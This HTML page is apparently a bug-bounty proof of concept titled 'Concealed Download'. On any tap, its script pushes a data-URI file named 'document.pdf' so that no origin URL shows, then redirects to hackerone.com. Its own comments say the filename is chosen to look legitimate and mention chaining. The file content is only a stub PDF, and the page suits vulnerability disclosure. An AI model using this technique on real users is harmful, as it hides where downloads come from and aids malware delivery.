<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Concealed Download</title>
  <style>
    body {
      height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
      background: #fafafa;
      cursor: pointer;
    }
    h1 {
      text-align: center;
      max-width: 420px;
    }
  </style>
</head>
<body>

<h1>
  Tap anywhere.<br>
  The file will be downloaded without an origin URL showing.
</h1>

<script>
document.addEventListener('click', () => {
  // Create "legitimate" file content (e.g., a PDF-like string, image data)
  const payload = `%PDF-1.4\n%âãÏÓ\n1 0 obj\n<< /Title (Test PDF) /Author (Your Name) >>\nendobj\n...`; 

  // Create a Data URI for the content (this does not expose an external URL)
  const dataUri = `data:application/pdf;base64,${btoa(payload)}`;

  // Create an <a> tag to trigger the download
  const a = document.createElement('a');
  a.href = dataUri;
  a.download = 'document.pdf'; // Suggested filename to make it look legitimate
  document.body.appendChild(a);
  a.click(); // Trigger the download

  // Clean up after triggering the download
  setTimeout(() => {
    a.remove(); // Clean up the <a> element
  }, 1000);

  // Optional: Redirect after a delay (for "chaining")
  setTimeout(() => {
    location.href = 'https://hackerone.com'; // Redirect to a different page after 3 seconds
  }, 3000); // Delay navigation
}, { once: true });
</script>

</body>
</html>
